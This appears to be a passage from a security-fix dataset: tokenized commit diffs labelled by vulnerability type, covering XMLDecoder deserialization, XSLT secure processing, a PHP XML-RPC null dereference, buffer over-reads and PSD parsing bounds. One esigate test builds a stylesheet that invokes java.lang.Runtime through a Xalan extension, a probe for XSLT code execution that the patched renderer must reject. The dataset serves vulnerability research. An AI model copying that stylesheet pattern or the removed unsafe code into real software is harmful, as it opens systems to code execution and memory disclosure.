"*", "(", "\"", "application", "/", "x", "-", "java", "-", "serialized", "-", "object", "+", "xml", "\"", ").", "*", "*", "SECURITY", "WARNING", ":", "The", "usage", "of", "{", "@", "link", "XMLDecoder", "}", "when", "deserializing", "XML", "*", "presentations", "from", "unstrusted", "sources", "can", "lead", "to", "malicious", "attacks", ".", "As", "*", "pointed", "<", "a", "href", "=", "*", "\"", "http", ":", "//", "blog", ".", "diniscruz", ".", "com", "/", "2013", "/", "08", "/", "using", "-", "xmldecoder", "-", "to", "-", "execute", "-", "server", "-", "side", ".", "html", "\"", "*", ">", "here", "<", "/", "a", ">", ",", "the", "{", "@", "link", "XMLDecoder", "}", "is", "able", "to", "force", "the", "JVM", "to", "execute", "*", "unwanted", "Java", "code", "described", "inside", "the", "XML", "file", ".", "Thus", ",", "the", "support", "of", "such", "*", "format", "has", "been", "disactivated", "by", "default", "inside", "the", "default", "converter", ".", "You", "can", "*", "activate", "this", "support", "by", "turning", "on", "the", "following", "system", "property", ":", "*", "org", ".", "restlet", ".", "engine", ".", "converter", ".", "DefaultConverter", ".", "VARIANT_OBJECT_XML_SUPPORTED", ".", "*", "*", "@", "author", "Jerome", "Louvel", "*", "@", "param", "<", "T", ">"], "docstring_tokens": ["xml", "deserialization"]}
{"contents": ["Merge", "pull", "request", "#199", "from", "esigate/nricheton-patch-2", "Cleanup", "XSLT", "tests", "and", "ensure", "secure", "rendering"], "code_tokens": ["@", "@", "-", "28", ",", "6", "+", "28", ",", "7", "@", "@", "import", "javax", ".", "xml", ".", "transform", ".", "dom", ".", "DOMResult", ";", "import", "javax", ".", "xml", ".", "transform", ".", "dom", ".", "DOMSource", ";", "import", "javax", ".", "xml", ".", "transform", ".", "stream", ".", "StreamSource", ";", "import", "javax", ".", "xml", ".", "XMLConstants", ";", "import", "nu", ".", "validator", ".", "htmlparser", ".", "common", ".", "DoctypeExpectation", ";", "import", "nu", ".", "validator", ".", "htmlparser", ".", "dom", ".", "Dom2Sax", ";", "@", "@", "-", "44", ",", "6", "+", "45", ",", "7", "@", "@", "import", "org", ".", "xml", ".", "sax", ".", "InputSource", ";", "import", "org", ".", "xml", ".", "sax", ".", "SAXException", ";", "/", "**", "*", "Applies", "an", "XSLT", "transformation", "to", "the", "retrieved", "data", ".", "*", "@", "@", "-", "88", ",", "6", "+", "90", ",", "8", "@", "@", "public", "XsltRenderer", "(", "String", "xsl", ")", "throws", "IOException", "{", "private", "static", "Transformer", "createTransformer", "(", "InputStream", "templateStream", ")", "throws", "IOException", "{", "try", "{", "/", "/", "Ensure", "XSLT", "cannot", "use", "advanced", "extensions", "during", "processing", ".", "TRANSFORMER_FACTORY", ".", "setFeature", "(", "XMLConstants", ".", "FEATURE_SECURE_PROCESSING", ",", "true", ")", ";", "return", "TRANSFORMER_FACTORY", ".", "newTransformer", "(", "new", "StreamSource", "(", "templateStream", ")", ");", "}", "catch", "(", "TransformerConfigurationException", "e", ")", "{", "throw", "new", "ProcessingFailedException", "(", "\"", "Failed", "to", "create", "XSLT", "template", "\"", ",", "e", ")", ";", "@", "@", "-", "15", ",", "26", "+", "15", ",", "34", "@", "@", "package", "org", ".", "esigate", ".", "xml", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertEquals", ";", "import", "junit", ".", "framework", ".", "TestCase", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "org", ".", "apache", ".", "commons", ".", "io", ".", "output", ".", "StringBuilderWriter", ";", "import", "org", ".", "junit", ".", "Test", ";", "public", "class", "XsltRendererTest", "extends", "TestCase", "{", "public", "class", "XsltRendererTest", "{", "/", "**", "*", "Tests", "xpath", "expression", "evaluation", ".", "*", "*", "@", "throws", "IOException", "*", "/", "@", "Test", "public", "void", "testXslt", "(", ")", "throws", "IOException", "{", "String", "src", "=", "\"", "<", "html", ">", "<", "body", ">", "The", "body", "<", "br", ">", "</", "body", ">", "</", "html", ">", "\";", "String", "result", "=", "extractBody", "(", "src", ")", ";", "String", "result", "=", "renderSimpleStyleSheet", "(", "src", ")", ";", "assertEquals", "(", "\"<", "body", ">", "The", "body", "<", "br", "/", "><", "/", "body", ">", "\",", "result", ")", ";", "}", "private", "String", "extractBody", "(", "String", "src", ")", "throws", "IOException", "{", "@", "Test", "(", "expected", "=", "ProcessingFailedException", ".", "class", ")", "public", "void", "testSecureRendering", "(", ")", "throws", "IOException", "{", "String", "src", "=", "\"", "<", "html", ">", "<", "body", ">", "The", "body", "<", "br", ">", "</", "body", ">", "</", "html", ">", "\";", "renderExtensionStyleSheet", "(", "src", ")", ";", "}", "private", "String", "renderSimpleStyleSheet", "(", "String", "src", ")", "throws", "IOException", "{", "String", "template", "=", "\"", "<?", "xml", "version", "=", "\\\"", "1", ".", "0", "\\", "\"?", ">\"", ";", "template", "+", "=", "\"", "<", "xsl", ":", "stylesheet", "version", "=", "\\\"", "1", ".", "0", "\\", "\"", "xmlns", "=", "\\\"", "http", ":", "//", "www", ".", "w3", ".", "org", "/", "1999", "/", "xhtml", "\\", "\"", "\"", "@", "@", "-", "52", ",", "18", "+", "60", ",", "40", "@", "@", "private", "String", "extractBody", "(", "String", "src", ")", "throws", "IOException", "{", "return", "out", ".", "toString", "(", ");", "}", "private", "String", "renderExtensionStyleSheet", "(", "String", "src", ")", "throws", "IOException", "{", "String", "template", "=", "\"", "<?", "xml", "version", "=", "\\\"", "1", ".", "0", "\\", "\"?", ">\"", ";", "template", "+", "=", "\"", "<", "xsl", ":", "stylesheet", "version", "=", "\\\"", "1", ".", "0", "\\", "\"", "xmlns", "=", "\\\"", "http", ":", "//", "www", ".", "w3", ".", "org", "/", "1999", "/", "xhtml", "\\", "\"", "\"", "+", "\"", "xmlns", ":", "html", "=", "\\\"", "http", ":", "//", "www", ".", "w3", ".", "org", "/", "1999", "/", "xhtml", "\\", "\"", "\"", "+", "\"", "xmlns", ":", "xsl", "=", "\\\"", "http", ":", "//", "www", ".", "w3", ".", "org", "/", "1999", "/", "XSL", "/", "Transform", "\\", "\">", "\";", "template", "+", "=", "\"", "<", "xsl", ":", "output", "method", "=", "\\\"", "xml", "\\", "\"", "omit", "-", "xml", "-", "declaration", "=", "\\\"", "yes", "\\", "\"/", ">\"", ";", "template", "+", "=", "\"", "<", "xsl", ":", "template", "match", "=", "\\\"", "/\\", "\"", "xmlns", ":", "xsl", "=", "\\\"", "http", ":", "//", "www", ".", "w3", ".", "org", "/", "1999", "/", "XSL", "/", "Transform", "\\", "\"", "xmlns", ":", "rt", "=", "\\\"", "http", ":", "//", "xml", ".", "apache", ".", "org", "/", "xalan", "/", "java", "/", "java", ".", "lang", ".", "Runtime", "\\", "\">", "\";", "template", "+", "=", "\"", "<", "xsl", ":", "variable", "name", "=", "\\\"", "rtObj", "\\", "\"", "select", "=", "\\\"", "rt", ":", "getRuntime", "(", ")\\", "\"/", ">\"", ";", "template", "+", "=", "\"", "<", "xsl", ":", "variable", "name", "=", "\\\"", "process", "\\", "\"", "select", "=", "\\\"", "rt", ":", "totalMemory", "(", "$", "rtObj", ")", "\\\"", "/>", "\";", "template", "+", "=", "\"", "Process", ":", "<", "xsl", ":", "value", "-", "of", "select", "=", "\\\"", "$", "process", "\\", "\"/", ">\\", "n", "\"", ";", "template", "+", "=", "\"", "</", "xsl", ":", "template", ">", "\";", "template", "+", "=", "\"", "</", "xsl", ":", "stylesheet", ">", "\";", "StringBuilderWriter", "out", "=", "new", "StringBuilderWriter", "(", ");", "XsltRenderer", "tested", "=", "new", "XsltRenderer", "(", "template", ")", ";", "tested", ".", "render", "(", "null", ",", "src", ",", "out", ")", ";", "return", "out", ".", "toString", "(", ");", "}", "/", "**", "*", "Tests", "parser", "does", "not", "throw", "an", "Exception", "for", "an", "unescaped", "'", "&'", "character", ".", "*", "*", "@", "throws", "Exception", "*", "/", "@", "Test", "public", "void", "testParserSupportsUnescapedAmpersandCharacter", "(", ")", "throws", "Exception", "{", "String", "src", "=", "\"", "<!", "DOCTYPE", "html", "PUBLIC", "\\", "\"-", "//", "W3C", "/", "/", "DTD", "XHTML", "1", ".", "0", "Strict", "/", "/", "EN", "\\", "\"", "\"", "+", "\"", "\\\"", "http", ":", "//", "www", ".", "w3", ".", "org", "/", "TR", "/", "xhtml1", "/", "DTD", "/", "xhtml1", "-", "strict", ".", "dtd", "\\", "\">", "\"", "+", "\"", "<", "html", "lang", "=", "\\\"", "fr", "\\", "\"", "xml", ":", "lang", "=", "\\\"", "fr", "\\", "\"", "xmlns", "=", "\\\"", "http", ":", "//", "www", ".", "w3", ".", "org", "/", "1999", "/", "xhtml", "\\", "\">", "\"", "+", "\"", "<", "head", ">", "<", "title", ">", "The", "header", "<", "/", "title", ">", "</", "head", ">", "<", "body", ">", "&", "x", "=", "</", "body", ">", "</", "html", ">", "\";", "String", "result", "=", "extractBody", "(", "src", ")", ";", "String", "result", "=", "renderSimpleStyleSheet", "(", "src", ")", ";", "assertEquals", "(", "\"<", "body", ">", "&", "amp", ";", "x", "=", "</", "body", ">", "\",", "result", ")", ";", "}", "@", "@", "-", "72", ",", "14", "+", "102", ",", "15", "@", "@", "public", "void", "testParserSupportsUnescapedAmpersandCharacter", "(", ")", "throws", "Exception", "{", "*", "*", "@", "throws", "Exception", "*", "/", "@", "Test", "public", "void", "testParserSupportsDuplicatedId", "(", ")", "throws", "Exception", "{", "String", "src", "=", "\"", "<!", "DOCTYPE", "html", "PUBLIC", "\\", "\"-", "//", "W3C", "/", "/", "DTD", "XHTML", "1", ".", "0", "Strict", "/", "/", "EN", "\\", "\"", "\"", "+", "\"", "\\\"", "http", ":", "//", "www", ".", "w3", ".", "org", "/", "TR", "/", "xhtml1", "/", "DTD", "/", "xhtml1", "-", "strict", ".", "dtd", "\\", "\">", "\"", "+", "\"", "<", "html", "lang", "=", "\\\"", "fr", "\\", "\"", "xml", ":", "lang", "=", "\\\"", "fr", "\\", "\"", "xmlns", "=", "\\\"", "http", ":", "//", "www", ".", "w3", ".", "org", "/", "1999", "/", "xhtml", "\\", "\">", "\"", "+", "\"", "<", "head", ">", "<", "title", ">", "The", "header", "<", "/", "title", ">", "</", "head", ">", "<", "body", ">", "\"", "+", "\"", "<", "span", "id", "=", "\\\"", "test", "\\", "\">", "a", "<", "/", "span", ">", "<", "span", "id", "=", "\\\"", "test", "\\", "\">", "b", "<", "/", "span", ">", "</", "body", ">", "</", "html", ">", "\";", "String", "result", "=", "extractBody", "(", "src", ")", ";", "String", "result", "=", "renderSimpleStyleSheet", "(", "src", ")", ";", "assertEquals", "(", "\"<", "body", ">", "<", "span", "id", "=", "\\\"", "test", "\\", "\">", "a", "<", "/", "span", ">", "<", "span", "id", "=", "\\\"", "test", "\\", "\">", "b", "<", "/", "span", ">", "</", "body", ">", "\",", "result", ")", ";", "}"], "docstring_tokens": ["remote", "code", "execution"]}
{"contents": ["Fix", ":", "null", "pointer", "dereference", "when", "processing", "invalid", "XML-RPC", "requests", "(bug", "#51288)"], "code_tokens": ["@", "@", "-", "3", ",", "6", "+", "3", ",", "9", "@", "@", "PHP", "NEWS", "?", "?", "?", "??", "2010", ",", "PHP", "5", ".", "2", ".", "14", "-", "Updated", "timezone", "database", "to", "version", "2010", ".", "3", ".", "(", "Derick", ")", "-", "Fixed", "a", "NULL", "pointer", "dereference", "when", "processing", "invalid", "XML", "-", "RPC", "requests", "(", "Fixes", "CVE", "-", "2010", "-", "0397", ",", "bug", "#", "51288", ")", ".", "(", "Raphael", "Geissert", ")", "-", "Fixed", "bug", "#", "51269", "(", "zlib", ".", "output_compression", "Overwrites", "Vary", "Header", ")", ".", "(", "Adam", ")", "-", "Fixed", "bug", "#", "51237", "(", "milter", "SAPI", "crash", "on", "startup", ")", ".", "(", "igmar", "at", "palsenberg", "dot", "com", ")", "-", "Fixed", "bug", "#", "51213", "(", "pdo_mssql", "is", "trimming", "value", "of", "the", "money", "column", ")", ".", "(", "Ilia", ",", "@", "@", "-", "0", ",", "0", "+", "1", ",", "14", "@", "@", "-", "-", "TEST", "-", "-", "Bug", "#", "51288", "(", "CVE", "-", "2010", "-", "0397", ",", "NULL", "pointer", "deref", "when", "no", "<", "methodName", ">", "in", "request", ")", "-", "-", "FILE", "-", "-", "<", "?", "php", "$", "method", "=", "NULL", ";", "$", "req", "=", "'", "<?", "xml", "version", "=", "\"", "1", ".", "0", "\"", "?>", "<", "methodCall", ">", "</", "methodCall", ">", "';", "var_dump", "(", "xmlrpc_decode_request", "(", "$", "req", ",", "$", "method", ")", ");", "var_dump", "(", "$", "method", ")", ";", "echo", "\"", "Done", "\\", "n", "\"", ";", "?", ">", "-", "-", "EXPECT", "-", "-", "NULL", "NULL", "Done", "@", "@", "-", "723", ",", "6", "+", "723", ",", "7", "@", "@", "zval", "*", "decode_request_worker", "(", "zval", "*", "xml_in", ",", "zval", "*", "encoding_in", ",", "zval", "*", "method_name_", "zval", "*", "retval", "=", "NULL", ";", "XMLRPC_REQUEST", "response", ";", "STRUCT_XMLRPC_REQUEST_INPUT_OPTIONS", "opts", "=", "{", "{", "0", "}", "};", "const", "char", "*", "method_name", ";", "opts", ".", "xml_elem_opts", ".", "encoding", "=", "encoding_in", "?", "utf8_get_encoding_id_from_string", "(", "Z_STRVAL_P", "(", "encoding_in", ")", ")", ":", "ENCODING_DEFAULT", ";", "/", "*", "generate", "XMLRPC_REQUEST", "from", "raw", "xml", "*", "/", "@", "@", "-", "733", ",", "10", "+", "734", ",", "15", "@", "@", "zval", "*", "decode_request_worker", "(", "zval", "*", "xml_in", ",", "zval", "*", "encoding_in", ",", "zval", "*", "method_name_", "if", "(", "XMLRPC_RequestGetRequestType", "(", "response", ")", "=", "=", "xmlrpc_request_call", ")", "{", "if", "(", "method_name_out", ")", "{", "zval_dtor", "(", "method_name_out", ")", ";", "Z_TYPE_P", "(", "method_name_out", ")", "=", "IS_STRING", ";", "Z_STRVAL_P", "(", "method_name_out", ")", "=", "estrdup", "(", "XMLRPC_RequestGetMethodName", "(", "response", ")", ");", "Z_STRLEN_P", "(", "method_name_out", ")", "=", "strlen", "(", "Z_STRVAL_P", "(", "method_name_out", ")", ");", "method_name", "=", "XMLRPC_RequestGetMethodName", "(", "response", ")", ";", "if", "(", "method_name", ")", "{", "zval_dtor", "(", "method_name_out", ")", ";", "Z_TYPE_P", "(", "method_name_out", ")", "=", "IS_STRING", ";", "Z_STRVAL_P", "(", "method_name_out", ")", "=", "estrdup", "(", "method_name", ")", ";", "Z_STRLEN_P", "(", "method_name_out", ")", "=", "strlen", "(", "Z_STRVAL_P", "(", "method_name_out", ")", ");", "}", "else", "{", "retval", "=", "NULL", ";", "}", "}", "}"], "docstring_tokens": ["pointer", "dereference"]}
{"contents": ["Fix", "unintialized", "memory", "access"], "code_tokens": ["@", "@", "-", "134", ",", "19", "+", "134", ",", "23", "@", "@", "BufferList", ".", "prototype", ".", "copy", "=", "function", "copy", "(", "dst", ",", "dstStart", ",", "srcStart", ",", "srcEnd", ")", "{", "if", "(", "bytes", ">", "l", ")", "{", "this", ".", "_bufs", "[", "i", "]", ".", "copy", "(", "dst", ",", "bufoff", ",", "start", ")", "bufoff", "+", "=", "l", "}", "else", "{", "this", ".", "_bufs", "[", "i", "]", ".", "copy", "(", "dst", ",", "bufoff", ",", "start", ",", "start", "+", "bytes", ")", "bufoff", "+", "=", "l", "break", "}", "bufoff", "+", "=", "l", "bytes", "-", "=", "l", "if", "(", "start", ")", "{", "start", "=", "0", "}", "}", "/", "/", "safeguard", "so", "that", "we", "don", "'", "t", "return", "uninitialized", "memory", "if", "(", "dst", ".", "length", ">", "bufoff", ")", "return", "dst", ".", "slice", "(", "0", ",", "bufoff", ")", "return", "dst", "}", "@", "@", "-", "188", ",", "6", "+", "192", ",", "11", "@", "@", "BufferList", ".", "prototype", ".", "toString", "=", "function", "toString", "(", "encoding", ",", "start", ",", "end", ")", "{", "}", "BufferList", ".", "prototype", ".", "consume", "=", "function", "consume", "(", "bytes", ")", "{", "/", "/", "first", ",", "normalize", "the", "argument", ",", "in", "accordance", "with", "how", "Buffer", "does", "it", "bytes", "=", "Math", ".", "trunc", "(", "bytes", ")", "/", "/", "do", "nothing", "if", "not", "a", "positive", "number", "if", "(", "Number", ".", "isNaN", "(", "bytes", ")", "|", "|", "bytes", "<", "=", "0", ")", "return", "this", "while", "(", "this", ".", "_bufs", ".", "length", ")", "{", "if", "(", "bytes", ">", "=", "this", ".", "_bufs", "[", "0", "]", ".", "length", ")", "{", "bytes", "-", "=", "this", ".", "_bufs", "[", "0", "]", ".", "length", "@", "@", "-", "463", ",", "6", "+", "463", ",", "22", "@", "@", "tape", "(", "'", "test", "toString", "encoding", "'", ",", "function", "(", "t", ")", "{", "t", ".", "end", "(", ")", "}", ")", "tape", "(", "'", "uninitialized", "memory", "'", ",", "function", "(", "t", ")", "{", "const", "secret", "=", "crypto", ".", "randomBytes", "(", "256", ")", "for", "(", "let", "i", "=", "0", ";", "i", "<", "1e6", ";", "i", "+", "+)", "{", "const", "clone", "=", "Buffer", ".", "from", "(", "secret", ")", "const", "bl", "=", "new", "BufferList", "(", ")", "bl", ".", "append", "(", "Buffer", ".", "from", "(", "'", "a", "'", "))", "bl", ".", "consume", "(", "-", "1024", ")", "const", "buf", "=", "bl", ".", "slice", "(", "1", ")", "if", "(", "buf", ".", "indexOf", "(", "clone", ")", "!", "==", "-", "1", ")", "{", "t", ".", "fail", "(", "`", "Match", "(", "at", "$", "{", "i", "}", ")`", ")", "break", "}", "}", "t", ".", "end", "(", ")", "}", ")", "!", "process", ".", "browser", "&", "&", "tape", "(", "'", "test", "stream", "'", ",", "function", "(", "t", ")", "{", "const", "random", "=", "crypto", ".", "randomBytes", "(", "65534", ")"], "docstring_tokens": ["buffer", "over-read"]}
{"contents": ["TIKA-3050", "--", "add", "xmp", "extraction", "from", "PSD", "files"], "code_tokens": ["@", "@", "-", "1", ",", "5", "+", "1", ",", "7", "@", "@", "Release", "1", ".", "24", "-", "?", "??", "*", "Extract", "XMP", "from", "PSD", "files", "(", "TIKA", "-", "3050", ")", ".", "*", "Added", "XMLProfiler", "as", "an", "optional", "parser", "to", "profile", "XFA", "and", "XMP", "in", "PDFs", "(", "TIKA", "-", "3045", ")", ".", "@", "@", "-", "58", ",", "8", "+", "58", ",", "8", "@", "@", "ATTACHMENT", ",", "//", "standard", "attachment", "as", "in", "email", "MACRO", ",", "/", "/", "any", "code", "that", "is", "intended", "to", "be", "run", "by", "the", "application", "METADATA", ",", "/", "/", "e", ".", "g", ".", "xmp", ",", "xfa", "FONT", ";", "//", "embedded", "font", "files", "/", "/", "what", "else", "?", "FONT", ",", "//", "embedded", "font", "files", "THUMBNAIL", ";", "//", "TODO", ":", "set", "this", "in", "parsers", "that", "handle", "thumbnails", "}", ";", "/", "**", "@", "@", "-", "16", ",", "23", "+", "16", ",", "31", "@", "@", "*", "/", "package", "org", ".", "apache", ".", "tika", ".", "parser", ".", "image", ";", "import", "java", ".", "io", ".", "ByteArrayInputStream", ";", "import", "java", ".", "io", ".", "EOFException", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "io", ".", "InputStream", ";", "import", "java", ".", "nio", ".", "file", ".", "Files", ";", "import", "java", ".", "nio", ".", "file", ".", "Paths", ";", "import", "java", ".", "util", ".", "Arrays", ";", "import", "java", ".", "util", ".", "Collections", ";", "import", "java", ".", "util", ".", "HashSet", ";", "import", "java", ".", "util", ".", "Set", ";", "import", "org", ".", "apache", ".", "poi", ".", "util", ".", "IOUtils", ";", "import", "org", ".", "apache", ".", "commons", ".", "io", ".", "IOUtils", ";", "import", "org", ".", "apache", ".", "tika", ".", "exception", ".", "TikaException", ";", "import", "org", ".", "apache", ".", "tika", ".", "extractor", ".", "EmbeddedDocumentExtractor", ";", "import", "org", ".", "apache", ".", "tika", ".", "extractor", ".", "EmbeddedDocumentUtil", ";", "import", "org", ".", "apache", ".", "tika", ".", "io", ".", "EndianUtils", ";", "import", "org", ".", "apache", ".", "tika", ".", "io", ".", "TikaInputStream", ";", "import", "org", ".", "apache", ".", "tika", ".", "metadata", ".", "Metadata", ";", "import", "org", ".", "apache", ".", "tika", ".", "metadata", ".", "Photoshop", ";", "import", "org", ".", "apache", ".", "tika", ".", "metadata", ".", "TIFF", ";", "import", "org", ".", "apache", ".", "tika", ".", "metadata", ".", "TikaCoreProperties", ";", "import", "org", ".", "apache", ".", "tika", ".", "mime", ".", "MediaType", ";", "import", "org", ".", "apache", ".", "tika", ".", "parser", ".", "AbstractParser", ";", "import", "org", ".", "apache", ".", "tika", ".", "parser", ".", "ParseContext", ";", "import", "org", ".", "apache", ".", "tika", ".", "parser", ".", "image", ".", "xmp", ".", "JempboxExtractor", ";", "import", "org", ".", "apache", ".", "tika", ".", "sax", ".", "XHTMLContentHandler", ";", "import", "org", ".", "xml", ".", "sax", ".", "ContentHandler", ";", "import", "org", ".", "xml", ".", "sax", ".", "SAXException", ";", "@", "@", "-", "44", ",", "6", "+", "52", ",", "9", "@", "@", "*", "<", "p", "/", ">", "*", "Documentation", "on", "the", "file", "format", "is", "available", "from", "*", "http", ":", "//", "www", ".", "adobe", ".", "com", "/", "devnet", "-", "apps", "/", "photoshop", "/", "fileformatashtml", "/", "PhotoshopFileFormats", ".", "htm", "*", "*", "An", "MIT", "-", "licensed", "python", "parser", "with", "test", "files", "is", ":", "*", "https", ":", "//", "github", ".", "com", "/", "psd", "-", "tools", "/", "psd", "-", "tools", "*", "/", "public", "class", "PSDParser", "extends", "AbstractParser", "{", "@", "@", "-", "56", ",", "6", "+", "67", ",", "9", "@", "@", "Collections", ".", "unmodifiableSet", "(", "new", "HashSet", "<", "MediaType", ">", "(", "Arrays", ".", "asList", "(", "MediaType", ".", "image", "(", "\"", "vnd", ".", "adobe", ".", "photoshop", "\"", "))", "))", ";", "private", "static", "final", "int", "MAX_DATA_LENGTH_BYTES", "=", "1000000", ";", "private", "static", "final", "int", "MAX_BLOCKS", "=", "10000", ";", "public", "Set", "<", "MediaType", ">", "getSupportedTypes", "(", "ParseContext", "context", ")", "{", "return", "SUPPORTED_TYPES", ";", "}", "@", "@", "-", "101", ",", "19", "+", "115", ",", "27", "@", "@", "public", "void", "parse", "(", "/", "/", "Colour", "mode", ",", "eg", "Bitmap", "or", "RGB", "int", "colorMode", "=", "EndianUtils", ".", "readUShortBE", "(", "stream", ")", ";", "metadata", ".", "set", "(", "Photoshop", ".", "COLOR_MODE", ",", "Photoshop", ".", "_COLOR_MODE_CHOICES_INDEXED", "[", "colorMode", "]", ");", "if", "(", "colorMode", "<", "Photoshop", ".", "_COLOR_MODE_CHOICES_INDEXED", ".", "length", ")", "{", "metadata", ".", "set", "(", "Photoshop", ".", "COLOR_MODE", ",", "Photoshop", ".", "_COLOR_MODE_CHOICES_INDEXED", "[", "colorMode", "]", ");", "}", "/", "/", "Next", "is", "the", "Color", "Mode", "section", "/", "/", "We", "don", "'", "t", "care", "about", "this", "bit", "long", "colorModeSectionSize", "=", "EndianUtils", ".", "readIntBE", "(", "stream", ")", ";", "stream", ".", "skip", "(", "colorModeSectionSize", ")", ";", "IOUtils", ".", "skipFully", "(", "stream", ",", "colorModeSectionSize", ")", ";", "/", "/", "Next", "is", "the", "Image", "Resources", "section", "/", "/", "Check", "for", "certain", "interesting", "keys", "here", "long", "imageResourcesSectionSize", "=", "EndianUtils", ".", "readIntBE", "(", "stream", ")", ";", "long", "read", "=", "0", ";", "while", "(", "read", "<", "imageResourcesSectionSize", ")", "{", "/", "/", "if", "something", "is", "corrupt", "about", "this", "number", ",", "prevent", "an", "/", "/", "infinite", "loop", "by", "only", "reading", "10000", "blocks", "int", "blocks", "=", "0", ";", "while", "(", "read", "<", "imageResourcesSectionSize", "&", "&", "blocks", "<", "MAX_BLOCKS", ")", "{", "ResourceBlock", "rb", "=", "new", "ResourceBlock", "(", "stream", ")", ";", "if", "(", "rb", ".", "totalLength", "<", "=", "0", ")", "{", "/", "/", "break", ";", "}", "read", "+", "=", "rb", ".", "totalLength", ";", "/", "/", "Is", "it", "one", "we", "can", "do", "something", "useful", "with", "?", "@", "@", "-", "124", ",", "8", "+", "146", ",", "12", "@", "@", "public", "void", "parse", "(", "}", "else", "if", "(", "rb", ".", "id", "=", "=", "ResourceBlock", ".", "ID_EXIF_3", ")", "{", "/", "/", "TODO", "Parse", "the", "EXIF", "info", "via", "ImageMetadataExtractor", "}", "else", "if", "(", "rb", ".", "id", "=", "=", "ResourceBlock", ".", "ID_XMP", ")", "{", "/", "/", "TODO", "Parse", "the", "XMP", "info", "via", "ImageMetadataExtractor", "/", "/", "if", "there", "are", "multiple", "xmps", "in", "a", "file", ",", "this", "will", "/", "/", "overwrite", "the", "data", "from", "the", "earlier", "xmp", "JempboxExtractor", "ex", "=", "new", "JempboxExtractor", "(", "metadata", ")", ";", "ex", ".", "parse", "(", "new", "ByteArrayInputStream", "(", "rb", ".", "data", ")", ");", "}", "blocks", "+", "+;", "}", "/", "/", "Next", "is", "the", "Layer", "and", "Mask", "Info", "@", "@", "-", "141", ",", "17", "+", "167", ",", "21", "@", "@", "public", "void", "parse", "(", "private", "static", "class", "ResourceBlock", "{", "private", "static", "final", "long", "SIGNATURE", "=", "0x3842494d", ";", "/", "/", "8BIM", "private", "static", "final", "int", "ID_CAPTION", "=", "0x03F0", ";", "private", "static", "final", "int", "ID_URL", "=", "0x040B", ";", "private", "static", "final", "int", "ID_EXIF_1", "=", "0x0422", ";", "private", "static", "final", "int", "ID_EXIF_3", "=", "0x0423", ";", "private", "static", "final", "int", "ID_XMP", "=", "0x0424", ";", "/", "/", "TODO", "private", "static", "final", "int", "ID_URL", "=", "0x040B", ";", "private", "static", "final", "int", "ID_AUTO_SAVE_FILE_PATH", "=", "0x043E", ";", "private", "static", "final", "int", "ID_THUMBNAIL_RESOURCE", "=", "0x040C", ";", "private", "int", "id", ";", "private", "String", "name", ";", "private", "byte", "[", "]", "data", ";", "private", "int", "totalLength", ";", "static", "int", "counter", "=", "0", ";", "private", "ResourceBlock", "(", "InputStream", "stream", ")", "throws", "IOException", ",", "TikaException", "{", "counter", "+", "+;", "/", "/", "Verify", "the", "signature", "long", "sig", "=", "EndianUtils", ".", "readIntBE", "(", "stream", ")", ";", "if", "(", "sig", "!", "=", "SIGNATURE", ")", "{", "@", "@", "-", "166", ",", "6", "+", "196", ",", "9", "@", "@", "private", "ResourceBlock", "(", "InputStream", "stream", ")", "throws", "IOException", ",", "TikaException", "{", "int", "nameLen", "=", "0", ";", "while", "(", "true", ")", "{", "int", "v", "=", "stream", ".", "read", "(", ");", "if", "(", "v", "<", "0", ")", "{", "throw", "new", "EOFException", "(", ");", "}", "nameLen", "+", "+;", "if", "(", "v", "=", "=", "0", ")", "{", "@", "@", "-", "182", ",", "16", "+", "215", ",", "26", "@", "@", "private", "ResourceBlock", "(", "InputStream", "stream", ")", "throws", "IOException", ",", "TikaException", "{", "}", "int", "dataLen", "=", "EndianUtils", ".", "readIntBE", "(", "stream", ")", ";", "if", "(", "dataLen", "<", "0", ")", "{", "throw", "new", "TikaException", "(", "\"", "data", "length", "must", "be", ">", "=", "0", ":", "\"", "+", "dataLen", ")", ";", "}", "if", "(", "dataLen", "%", "2", "=", "=", "1", ")", "{", "/", "/", "Data", "Length", "is", "even", "padded", "dataLen", "=", "dataLen", "+", "1", ";", "}", "/", "/", "protect", "against", "overflow", "if", "(", "Integer", ".", "MAX_VALUE", "-", "dataLen", "<", "nameLen", "+", "10", ")", "{", "throw", "new", "TikaException", "(", "\"", "data", "length", "is", "too", "long", ":", "\"+", "dataLen", ")", ";", "}", "totalLength", "=", "4", "+", "2", "+", "nameLen", "+", "4", "+", "dataLen", ";", "/", "/", "Do", "we", "have", "use", "for", "the", "data", "segment", "?", "if", "(", "captureData", "(", "id", ")", ")", "{", "data", "=", "new", "byte", "[", "dataLen", "]", ";", "IOUtils", ".", "readFully", "(", "stream", ",", "data", ")", ";", "if", "(", "dataLen", ">", "MAX_DATA_LENGTH_BYTES", ")", "{", "throw", "new", "TikaException", "(", "\"", "data", "length", "must", "be", "<", "\"", "+", "MAX_DATA_LENGTH_BYTES", "\"", ":", "\"", "+", "dataLen", ")", ";", "}", "data", "=", "new", "byte", "[", "dataLen", "]", ";", "IOUtils", ".", "readFully", "(", "stream", ",", "data", ")", ";", "}", "else", "{", "data", "=", "new", "byte", "[", "0", "]", ";", "IOUtils", ".", "skipFully", "(", "stream", ",", "dataLen", ")", ";", "@", "@", "-", "19", ",", "14", "+", "19", ",", "20", "@", "@", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertEquals", ";", "import", "java", ".", "io", ".", "InputStream", ";", "import", "java", ".", "nio", ".", "file", ".", "Files", ";", "import", "java", ".", "nio", ".", "file", ".", "Paths", ";", "import", "java", ".", "util", ".", "List", ";", "import", "org", ".", "apache", ".", "tika", ".", "TikaTest", ";", "import", "org", ".", "apache", ".", "tika", ".", "io", ".", "TikaInputStream", ";", "import", "org", ".", "apache", ".", "tika", ".", "metadata", ".", "Metadata", ";", "import", "org", ".", "apache", ".", "tika", ".", "metadata", ".", "XMPMM", ";", "import", "org", ".", "apache", ".", "tika", ".", "parser", ".", "ParseContext", ";", "import", "org", ".", "apache", ".", "tika", ".", "parser", ".", "Parser", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "xml", ".", "sax", ".", "helpers", ".", "DefaultHandler", ";", "public", "class", "PSDParserTest", "{", "public", "class", "PSDParserTest", "extends", "TikaTest", "{", "private", "final", "Parser", "parser", "=", "new", "PSDParser", "(", ");", "@", "@", "-", "61", ",", "4", "+", "67", ",", "11", "@", "@", "public", "void", "testOddPSD", "(", ")", "throws", "Exception", "{", "assertEquals", "(", "\"", "70", 